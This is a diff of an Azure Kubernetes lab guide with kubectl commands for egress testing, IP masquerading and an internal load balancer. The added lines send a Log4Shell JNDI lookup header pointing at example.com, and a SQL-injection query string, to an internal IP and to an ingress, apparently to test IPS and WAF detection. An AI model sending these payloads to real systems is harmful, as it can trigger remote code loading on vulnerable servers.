@@ -135,6 +135,8 @@ spec:
         - protocol: TCP
           port: 443
 EOF
+
+kubectl delete networkpolicy/multi-port-egress
 ```
 
 ### Linux VM
@@ -185,18 +187,45 @@ data:
 EOF
 
 # remove config mod
+kubectl describe cm/azure-ip-masq-agent-config -n kube-system
 kubectl delete cm/azure-ip-masq-agent-config -n kube-system
 
 # scale web deploy
-kubectl scale deploy web --replicas 6
+kubectl scale deploy web --replicas 11
 PODS=$(kubectl get pod -l app=web -o name)
 # go from every pod
 while true; do
   for P in $PODS; do echo $P; kubectl exec -it $P -- curl -m1 ip.iol.cz/ip/; echo; done
   for P in $PODS; do echo $P; kubectl exec -it $P -- curl -m1 ifconfig.me; echo; done
-  for P in $PODS; do echo $P; kubectl exec -it $P -- curl -m1 10.68.2.4; echo; done
+  # log4j - IPS
+  for P in $PODS; do echo $P; kubectl exec -it $P -- curl -m1 10.68.2.4  -H 'X-Log: ${jndi:ldap://example.com}'; echo; done
   sleep 2;
 done
+
+# local log4j to appsec ingress
+curl -m1 https://aksdemo.klaud.online/?q=1 
+curl -m1 https://aksdemo.klaud.online/?q=UNION+1=1
+curl -m1 https://aksdemo.klaud.online/?q=1 -H 'X-Log: ${jndi:ldap://example.com}';
 ```
 
 Ingress https://learn.microsoft.com/en-us/azure/firewall/protect-azure-kubernetes-service
+
+```shell
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Service
+metadata:
+  name: internal-web
+  annotations:
+    service.beta.kubernetes.io/azure-load-balancer-internal: "true"
+spec:
+  type: LoadBalancer
+  ports:
+  - port: 80
+  selector:
+    app: web
+EOF
+
+kubectl delete svc internal-web
+kubectl get svc
+```
